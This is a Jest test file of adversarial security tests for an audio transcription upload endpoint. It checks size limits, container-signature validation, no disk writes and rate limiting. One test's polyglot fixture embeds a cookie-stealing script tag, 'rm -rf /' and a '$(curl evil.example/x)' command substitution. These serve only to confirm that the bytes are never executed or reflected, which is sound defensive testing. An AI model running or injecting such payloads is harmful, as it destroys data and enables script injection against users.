// Adversarial security tests (Workstream 5 review) -- POST
"use strict";

const fs = require("fs");
const path = require("path");
const jwt = require("jsonwebtoken");
const request = require("supertest");

const TEST_JWT_SECRET = "sia-adversarial-audio-test-secret";
const FAKE_GROQ_CREDENTIAL = "test-groq-credential-not-a-real-key";

const READY_VOICE_CONFIG = {
  enabled: false,
  provider: null,
  model: null,
  timeoutMs: 8000,
  voiceEnabled: true,
  sttProvider: "groq",
  sttModel: "whisper-large-v3-turbo",
  sttTimeoutMs: 30000,
  sttMaxBytes: 5242880,
  sttMaxDurationSeconds: 45,
};

jest.mock("../sia/config", () => ({
  enabled: false,
  provider: null,
  model: null,
  timeoutMs: 8000,
  voiceEnabled: true,
  sttProvider: "groq",
  sttModel: "whisper-large-v3-turbo",
  sttTimeoutMs: 30000,
  sttMaxBytes: 5242880,
  sttMaxDurationSeconds: 45,
}));

jest.mock("../sia/transcriptionService", () => {
  const actual = jest.requireActual("../sia/transcriptionService");
  return {
    transcribeAudio: jest.fn(),
    TranscriptionProviderError: actual.TranscriptionProviderError,
  };
});

jest.mock("../sia/llmService", () => {
  const actual = jest.requireActual("../sia/llmService");
  return {
    askLlm: jest.fn(async () => {
      throw new Error("transcriptions must never call the LLM answer pipeline");
    }),
    LlmProviderError: actual.LlmProviderError,
  };
});

jest.mock("../sia/contextBuilder", () => ({
  buildContext: jest.fn(async () => {
    throw new Error("transcriptions must never build an analytics context");
  }),
}));

jest.mock("../sia/sessionService", () => ({
  findOwnedSession: jest.fn(async () => {
    throw new Error("transcriptions must never touch a SIA session");
  }),
  createSession: jest.fn(async () => {
    throw new Error("transcriptions must never create a SIA session");
  }),
  appendTurn: jest.fn(async () => {
    throw new Error("transcriptions must never append a SIA turn");
  }),
  loadRecentTurns: jest.fn(async () => {
    throw new Error("transcriptions must never load SIA turns");
  }),
}));

const config = require("../sia/config");
const { transcribeAudio: transcribeAudioMock } = require("../sia/transcriptionService");

const app = require("../app");

const originalJwtSecret = process.env.JWT_SECRET;
const originalGroqKey = process.env.GROQ_API_KEY;

beforeAll(() => {
  process.env.JWT_SECRET = TEST_JWT_SECRET;
});

afterAll(() => {
  if (originalJwtSecret === undefined) delete process.env.JWT_SECRET;
  else process.env.JWT_SECRET = originalJwtSecret;
  if (originalGroqKey === undefined) delete process.env.GROQ_API_KEY;
  else process.env.GROQ_API_KEY = originalGroqKey;
});

beforeEach(() => {
  Object.assign(config, READY_VOICE_CONFIG);
  process.env.GROQ_API_KEY = FAKE_GROQ_CREDENTIAL;
  transcribeAudioMock.mockReset();
  transcribeAudioMock.mockImplementation(async () => ({
    transcript: "safe default transcript",
    detectedLanguage: "en",
    durationMs: 1000,
  }));
});

function signToken(userId) {
  return jwt.sign({ email: "sia-adversarial-audio-test@example.test", _id: userId }, TEST_JWT_SECRET);
}

function padTo(buffer, length) {
  if (buffer.length >= length) return buffer;
  return Buffer.concat([buffer, Buffer.alloc(length - buffer.length)]);
}

function webmFixture(totalSize = 32) {
  return padTo(Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0, 0, 0, 0]), totalSize);
}

describe("adversarial: exact SIA_STT_MAX_BYTES boundary (off-by-one correctness)", () => {
  // FINDING (low severity, documentation/UX nuance, not a security gap):
  it("rejects a file at EXACTLY the configured max byte size (multer's fileSize limit is exclusive, not inclusive)", async () => {
    config.sttMaxBytes = 100;
    const res = await request(app)
      .post("/sia/transcriptions")
      .set("Authorization", `Bearer ${signToken("boundary-user-1")}`)
      .attach("audio", webmFixture(100), { filename: "clip.webm", contentType: "audio/webm" });

    expect(res.status).toBe(413);
    expect(transcribeAudioMock).not.toHaveBeenCalled();
  });

  it("rejects a file at EXACTLY max+1 bytes with 413, never forwarded to the provider", async () => {
    config.sttMaxBytes = 100;
    const res = await request(app)
      .post("/sia/transcriptions")
      .set("Authorization", `Bearer ${signToken("boundary-user-2")}`)
      .attach("audio", webmFixture(101), { filename: "clip.webm", contentType: "audio/webm" });

    expect(res.status).toBe(413);
    expect(res.body).toEqual({ success: false, message: "Audio file exceeds the maximum allowed size." });
    expect(transcribeAudioMock).not.toHaveBeenCalled();
  });

  it("accepts a file at max-1 bytes", async () => {
    config.sttMaxBytes = 100;
    const res = await request(app)
      .post("/sia/transcriptions")
      .set("Authorization", `Bearer ${signToken("boundary-user-3")}`)
      .attach("audio", webmFixture(99), { filename: "clip.webm", contentType: "audio/webm" });

    expect(res.status).toBe(200);
    expect(transcribeAudioMock).toHaveBeenCalledTimes(1);
  });
});

describe("adversarial: polyglot payload (valid container signature + embedded script/shell-metacharacter bytes)", () => {
  it("forwards the polyglot payload opaquely to the provider boundary -- never executes/interprets it, and it never appears in the response", async () => {
    // Genuine WAV signature ("RIFF"...."WAVE") followed by bytes that would
    // be dangerous if ever interpreted as HTML/JS or a shell command.
    const riffHeader = Buffer.from([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0, 0x57, 0x41, 0x56, 0x45]);
    const maliciousTail = Buffer.from(
      "<script>alert(document.cookie)</script>; rm -rf / ; $(curl evil.example/x) `id`",
      "utf8"
    );
    const polyglot = Buffer.concat([riffHeader, maliciousTail]);

    let capturedBuffer = null;
    transcribeAudioMock.mockImplementation(async ({ buffer }) => {
      capturedBuffer = buffer;
      return { transcript: "a perfectly normal transcript", detectedLanguage: "en", durationMs: 500 };
    });

    const res = await request(app)
      .post("/sia/transcriptions")
      .set("Authorization", `Bearer ${signToken("polyglot-user")}`)
      .attach("audio", polyglot, { filename: "clip.wav", contentType: "audio/wav" });

    expect(res.status).toBe(200);
    // The exact, unmodified bytes reached the provider boundary function
    // (opaque pass-through) -- never parsed, executed, or transformed.
    expect(Buffer.isBuffer(capturedBuffer)).toBe(true);
    expect(capturedBuffer.equals(polyglot)).toBe(true);
    // The malicious payload never appears anywhere in the JSON response
    // (no reflection).
    const bodyStr = JSON.stringify(res.body);
    expect(bodyStr).not.toContain("<script>");
    expect(bodyStr).not.toContain("rm -rf");
    expect(bodyStr).not.toContain("curl evil.example");
  });

  it("still 415-rejects a polyglot whose leading bytes do NOT match any real container signature, regardless of embedded content", async () => {
    const fakeSignature = Buffer.from("GIF89a", "utf8"); // not one of the 4 accepted containers
    const maliciousTail = Buffer.from("<script>alert(1)</script>", "utf8");
    const polyglot = Buffer.concat([fakeSignature, maliciousTail]);

    const res = await request(app)
      .post("/sia/transcriptions")
      .set("Authorization", `Bearer ${signToken("polyglot-user-2")}`)
      .attach("audio", polyglot, { filename: "clip.gif.webm", contentType: "audio/webm" });

    expect(res.status).toBe(415);
    expect(transcribeAudioMock).not.toHaveBeenCalled();
  });
});

describe("static source review: no upload byte is ever written to disk", () => {
  const audioUploadSource = fs.readFileSync(path.resolve(__dirname, "../Middlewares/audioUpload.js"), "utf8");
  const transcribeSource = fs.readFileSync(path.resolve(__dirname, "../Controllers/SiaControllers/transcribe.js"), "utf8");
  const transcriptionServiceSource = fs.readFileSync(path.resolve(__dirname, "../sia/transcriptionService.js"), "utf8");

  it("Middlewares/audioUpload.js uses multer.memoryStorage() and never fs.write*/createWriteStream/diskStorage", () => {
    expect(audioUploadSource).toMatch(/multer\.memoryStorage\(\)/);
    expect(audioUploadSource).not.toMatch(/diskStorage/);
    expect(audioUploadSource).not.toMatch(/fs\.write|createWriteStream/);
  });

  it("Controllers/SiaControllers/transcribe.js never writes the uploaded buffer to disk", () => {
    expect(transcribeSource).not.toMatch(/fs\.write|createWriteStream|require\(["']fs["']\)/);
  });

  it("sia/transcriptionService.js never writes the buffer to disk (forwards it directly to the multipart form)", () => {
    expect(transcriptionServiceSource).not.toMatch(/fs\.write|createWriteStream|require\(["']fs["']\)/);
  });
});

describe("static source review: siaVoiceLimiter is a genuinely separate limiter instance from siaLimiter", () => {
  const rateLimiterSource = fs.readFileSync(path.resolve(__dirname, "../utils/rateLimiter.js"), "utf8");
  const routesSource = fs.readFileSync(path.resolve(__dirname, "../Routes/sia.routes.js"), "utf8");

  it("declares siaVoiceLimiter via its own rateLimit(...) call, not an alias of siaLimiter", () => {
    const rateLimitCallCount = (rateLimiterSource.match(/=\s*rateLimit\(/g) || []).length;
    expect(rateLimitCallCount).toBeGreaterThanOrEqual(4); // apiLimiter, authLimiter, siaLimiter, siaVoiceLimiter
    expect(rateLimiterSource).toMatch(/const siaVoiceLimiter = rateLimit\(/);
    expect(rateLimiterSource).not.toMatch(/const siaVoiceLimiter = siaLimiter/);
  });

  it("wires POST /sia/transcriptions to siaVoiceLimiter (never the plain siaLimiter)", () => {
    const transcriptionsRouteMatch = routesSource.match(
      /router\.post\(\s*["']\/transcriptions["'][\s\S]*?\);/
    );
    expect(transcriptionsRouteMatch).not.toBeNull();
    expect(transcriptionsRouteMatch[0]).toMatch(/siaVoiceLimiter/);
  });
});

describe("adversarial: repeated rapid requests genuinely hit siaVoiceLimiter's own budget", () => {
  it("the 16th request within the window is rejected with 429, using a limiter bucket independent of siaLimiter", async () => {
    const userId = "flood-user-1";
    let lastRes;
    for (let i = 0; i < 16; i += 1) {
      lastRes = await request(app)
        .post("/sia/transcriptions")
        .set("Authorization", `Bearer ${signToken(userId)}`)
        .attach("audio", webmFixture(), { filename: "clip.webm", contentType: "audio/webm" });
    }
    // siaVoiceLimiter's documented budget is 15 per 15-minute window (see
    expect(lastRes.status).toBe(429);
  });
});
